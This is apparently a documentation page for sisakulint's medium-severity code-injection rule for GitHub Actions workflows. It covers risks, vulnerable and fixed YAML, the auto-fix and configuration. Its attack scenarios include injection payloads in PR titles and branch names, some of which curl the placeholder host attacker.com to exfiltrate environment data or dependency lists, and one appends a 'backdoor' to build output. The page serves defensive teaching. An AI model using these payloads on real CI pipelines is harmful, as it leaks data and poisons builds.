---
title: "Code Injection Rule (Medium)"
weight: 10
# bookFlatSection: false
# bookToc: true
# bookHidden: false
# bookCollapseSection: false
# bookComments: false
# bookSearchExclude: false
---

### Code Injection Rule (Medium) Overview

This rule detects code injection vulnerabilities when untrusted input is used directly in shell scripts or JavaScript code within **normal workflow contexts**. While these workflows typically have limited permissions, they can still be exploited to leak information, manipulate builds, or serve as stepping stones for more serious attacks.

#### Key Features:

- **Normal Trigger Detection**: Identifies dangerous patterns in `pull_request`, `push`, `schedule`, and other non-privileged triggers
- **Dual Script Detection**: Analyzes both `run:` scripts and `actions/github-script` for untrusted input
- **Auto-fix Support**: Automatically converts unsafe patterns to use environment variables
- **Build Integrity Protection**: Prevents manipulation of test results, artifacts, and build processes

### Security Impact

**Severity: Medium (6/10)**

Code injection in normal workflows presents moderate security risks:

1. **Information Disclosure**: Leaking environment details, dependencies, or build configurations
2. **Build Manipulation**: Altering test results, coverage reports, or build artifacts
3. **CI/CD Workflow Disruption**: Causing builds to fail or hang
4. **Stepping Stone Attacks**: Gathering information for more targeted attacks

This vulnerability is classified as **CWE-94: Improper Control of Generation of Code ('Code Injection')** and represents a defense-in-depth security measure.

### Normal Workflow Triggers

The following triggers are considered normal (non-privileged) with limited permissions:

- **`pull_request`**: Read-only access, no secrets by default
- **`push`**: Triggered only by trusted commits to the repository
- **`schedule`**: Time-based triggers with read-only access
- **`workflow_dispatch`**: Manual triggers (trusted users only)

These triggers typically run with:
- Read-only `GITHUB_TOKEN` permissions
- No access to repository secrets (unless explicitly granted)
- Limited ability to modify repository contents

### Example Vulnerable Workflow

Consider this workflow that processes PR data with limited permissions:

```yaml
name: PR Analysis

on:
  pull_request:  # NORMAL: Read-only by default
    types: [opened, synchronize]

jobs:
  analyze:
    runs-on: ubuntu-latest
    steps:
      # MEDIUM VULNERABILITY: Untrusted input in normal context
      - name: Analyze PR title
        run: |
          echo "Analyzing: ${{ github.event.pull_request.title }}"
          if [[ "${{ github.event.pull_request.title }}" =~ "[WIP]" ]]; then
            echo "Work in progress PR"
          fi
```

### Attack Scenario

**How Code Injection Exploits Normal Workflows:**

1. **Attacker Creates Malicious PR**: Opens a PR with a crafted title:
   ```
   Title: feat: add feature"; curl https://attacker.com/recon?env=$(env | base64) #
   ```

2. **Workflow Triggers**: `pull_request` runs with read-only permissions

3. **Command Injection**: The shell interprets the malicious title:
   ```bash
   echo "Analyzing: feat: add feature"; curl https://attacker.com/recon?env=$(env | base64) #"
   ```

4. **Information Leakage**: Build environment details sent to attacker

5. **Reconnaissance**: Attacker gathers information about:
   - Environment variables
   - Installed tools and versions
   - Network configuration
   - File system structure

While less severe than critical vulnerabilities, this enables:
- Mapping of the CI/CD environment
- Discovery of potential attack vectors
- Build process manipulation
- Foundation for supply chain attacks

### Example Output

Running sisakulint will detect untrusted input in normal contexts:

```bash
$ sisakulint

.github/workflows/pr-analyze.yaml:11:20: code injection (medium): "github.event.pull_request.title" is potentially untrusted. Avoid using it directly in inline scripts. Instead, pass it through an environment variable. See https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions [code-injection-medium]
     11 👈|        run: |
              echo "Analyzing: ${{ github.event.pull_request.title }}"
```

### Auto-fix Support

The code-injection-medium rule supports auto-fixing by converting unsafe patterns to use environment variables:

```bash
# Preview changes without applying
sisakulint -fix dry-run

# Apply fixes
sisakulint -fix on
```

#### Auto-fix for Run Scripts

**Before (Vulnerable):**
```yaml
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Test PR
        run: |
          echo "PR: ${{ github.event.pull_request.title }}"
          echo "Branch: ${{ github.event.pull_request.head.ref }}"
```

**After (Secure):**
```yaml
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Test PR
        run: |
          echo "PR: $PR_TITLE"
          echo "Branch: $PR_REF"
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
          PR_REF: ${{ github.event.pull_request.head.ref }}
```

#### Auto-fix for GitHub Script

**Before (Vulnerable):**
```yaml
on: pull_request
jobs:
  comment:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@v6
        with:
          script: |
            const title = '${{ github.event.pull_request.title }}'
            console.log('PR Title:', title)
```

**After (Secure):**
```yaml
on: pull_request
jobs:
  comment:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@v6
        with:
          script: |
            const title = process.env.PR_TITLE
            console.log('PR Title:', title)
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
```

### Best Practices

#### 1. Always Use Environment Variables for Untrusted Input

Even in read-only contexts, use environment variables to prevent injection:

**Bad (Vulnerable):**
```yaml
on: pull_request
jobs:
  test:
    steps:
      - run: echo "Testing: ${{ github.event.pull_request.title }}"
```

**Good (Safe):**
```yaml
on: pull_request
jobs:
  test:
    steps:
      - run: echo "Testing: $PR_TITLE"
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
```

#### 2. Validate Input Even in Limited Contexts

Add validation for untrusted input:

```yaml
on: pull_request
jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - name: Validate PR title format
        run: |
          # Only allow alphanumeric, spaces, and common punctuation
          if [[ ! "$PR_TITLE" =~ ^[a-zA-Z0-9\ \.\-\:]+$ ]]; then
            echo "Error: PR title contains invalid characters"
            exit 1
          fi
          echo "Valid title: $PR_TITLE"
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
```

#### 3. Sanitize Before Display or Logging

Be careful when displaying untrusted input:

```yaml
on: pull_request
jobs:
  report:
    steps:
      - name: Generate report
        run: |
          # Sanitize for safe display
          SAFE_TITLE=$(echo "$PR_TITLE" | tr -cd '[:alnum:][:space:].-')
          echo "# PR Report" > report.md
          echo "Title: $SAFE_TITLE" >> report.md
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
```

#### 4. Limit Output Exposure

Avoid echoing untrusted input where it could be logged:

**Bad (Logs Exposed):**
```yaml
- run: echo "Debug: ${{ github.event.pull_request.body }}"
  # Full PR body appears in public logs
```

**Good (Limited Exposure):**
```yaml
- run: |
    # Only log sanitized metadata
    echo "PR length: ${#PR_BODY}"
  env:
    PR_BODY: ${{ github.event.pull_request.body }}
```

### Common Untrusted Inputs

The following GitHub context properties are considered untrusted in normal workflows:

**Pull Request Data:**
- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.pull_request.head.ref`
- `github.event.pull_request.head.label`
- `github.event.pull_request.head.sha`

**Push Data:**
- `github.event.head_commit.message`
- `github.event.commits[*].message`
- `github.head_ref`

**Other Sources:**
- `github.event.*.body` (any body field)
- User-controlled workflow inputs

### Real-World Attack Vectors

#### Attack Vector 1: Test Result Manipulation

**Malicious PR Title:**
```
feat: new feature"; echo "All tests passed!" > test-results.txt; exit 0 #
```

**Vulnerable Workflow:**
```yaml
on: pull_request
jobs:
  test:
    steps:
      - run: |
          echo "Testing: ${{ github.event.pull_request.title }}"
          npm test > test-results.txt
```

**Result:** Test results overwritten, hiding actual failures.

#### Attack Vector 2: Dependency Reconnaissance

**Malicious PR Title:**
```
fix: typo"; npm list > /tmp/deps.txt; curl -F file=@/tmp/deps.txt https://attacker.com/upload #
```

**Vulnerable Workflow:**
```yaml
on: pull_request
jobs:
  build:
    steps:
      - run: echo "Building: ${{ github.event.pull_request.title }}"
      - run: npm install
```

**Result:** Dependency tree leaked to attacker.

#### Attack Vector 3: Build Artifact Manipulation

**Malicious Branch Name:**
```
feature/new-api"; echo "backdoor" >> dist/index.js #
```

**Vulnerable Workflow:**
```yaml
on: push
jobs:
  build:
    steps:
      - run: echo "Building branch: ${{ github.ref_name }}"
      - run: npm run build
```

**Result:** Build artifacts poisoned with malicious code.

### Detection Patterns

The code-injection-medium rule detects:

1. **Direct interpolation in run scripts**:
   ```yaml
   run: echo "${{ github.event.pull_request.title }}"
   ```

2. **Direct interpolation in github-script**:
   ```yaml
   script: |
     const title = '${{ github.event.pull_request.title }}'
   ```

3. **Multiple untrusted inputs**:
   ```yaml
   run: |
     echo "${{ github.event.pull_request.title }}"
     echo "${{ github.event.pull_request.body }}"
   ```

### Safe Patterns

The rule recognizes these patterns as safe:

1. **Environment variables**:
   ```yaml
   run: echo "$PR_TITLE"
   env:
     PR_TITLE: ${{ github.event.pull_request.title }}
   ```

2. **Trusted inputs** (not flagged):
   ```yaml
   run: echo "${{ github.sha }}"  # Trusted
   run: echo "${{ github.repository }}"  # Trusted
   ```

### Difference from Critical Severity

The **medium** rule flags patterns in normal (non-privileged) triggers where exploitation has limited impact. The **critical** rule flags the same patterns in privileged triggers where the risk is severe.

| Trigger Type | Rule | Risk Level | Permissions |
|--------------|------|------------|-------------|
| `pull_request` | Medium | 6/10 | Read-only |
| `pull_request_target` | Critical | 10/10 | Write + secrets |
| `push` | Medium | 6/10 | Read-only (usually) |
| `workflow_run` | Critical | 10/10 | Elevated privileges |

### Defense in Depth

Even though normal workflows have limited permissions, fixing these issues provides:

1. **Layered Security**: Multiple defensive barriers
2. **Future-Proofing**: Protection if permissions are later expanded
3. **Best Practice Enforcement**: Consistent secure coding patterns
4. **Attack Surface Reduction**: Fewer potential entry points

### When to Fix Medium Issues

Prioritize fixing medium severity issues when:

1. **High Compliance Requirements**: Industry regulations require comprehensive security
2. **Sensitive Information**: Build environment contains proprietary details
3. **Complex CI/CD**: Many interconnected workflows
4. **Public Repository**: Higher risk of malicious contributions
5. **Zero Trust Policy**: Assume all input is malicious

### Integration with GitHub Security Features

This rule complements:

- **Branch Protection**: Require review for workflow changes
- **Status Checks**: Block PRs with security issues
- **Workflow Permissions**: Explicitly limit `GITHUB_TOKEN` scope
- **Environment Protection**: Require approval for sensitive environments

### CodeQL Integration

This rule is inspired by CodeQL's code-injection-medium query:
- [CodeQL Query: Code Injection (Medium)](https://codeql.github.com/codeql-query-help/actions/actions-code-injection-medium/)

sisakulint provides:
- Faster feedback during development
- Auto-fix capabilities
- No licensing requirements
- Local development integration

### OWASP CI/CD Security Alignment

This rule addresses:

**CICD-SEC-04: Poisoned Pipeline Execution (PPE)**
- Prevents command injection in CI/CD pipelines
- Enforces input sanitization
- Reduces attack surface

**Defense in Depth Principle**
- Multiple security layers
- Comprehensive protection strategy

### Complementary Rules

Use these rules together for comprehensive protection:

1. **code-injection-critical**: Detect severe issues in privileged triggers
2. **envvar-injection-medium**: Adds specialized detection and mitigation for $GITHUB_ENV writes (see [envvar-injection-critical Rule Interactions]({{< ref "envvarinjectioncritical.md#rule-interactions" >}}) for details)
3. **permissions**: Enforce least privilege principle
4. **timeout-minutes**: Prevent resource exhaustion
5. **untrusted-checkout**: Prevent checkout of malicious code

### Performance Considerations

This rule has minimal performance impact:
- **Detection**: O(n) where n is the number of steps
- **Auto-fix**: In-place AST and YAML modification
- **No External Calls**: Purely static analysis

### Configuration

To disable warnings for specific patterns (not recommended):

```bash
# Ignore medium severity code injection warnings
sisakulint -ignore "code-injection-medium"
```

### See Also

**Industry References:**
- [CodeQL: Code Injection (Medium)](https://codeql.github.com/codeql-query-help/actions/actions-code-injection-medium/) - CodeQL's detection pattern
- [GitHub: Security Hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions) - Official security guidance
- [OWASP: Defense in Depth](https://owasp.org/www-community/Defense_in_depth) - Layered security approach
- [CWE-94: Code Injection](https://cwe.mitre.org/data/definitions/94.html) - Vulnerability classification

{{< popup_link2 href="https://codeql.github.com/codeql-query-help/actions/actions-code-injection-medium/" >}}

{{< popup_link2 href="https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions" >}}

{{< popup_link2 href="https://owasp.org/www-community/Defense_in_depth" >}}

{{< popup_link2 href="https://cwe.mitre.org/data/definitions/94.html" >}}
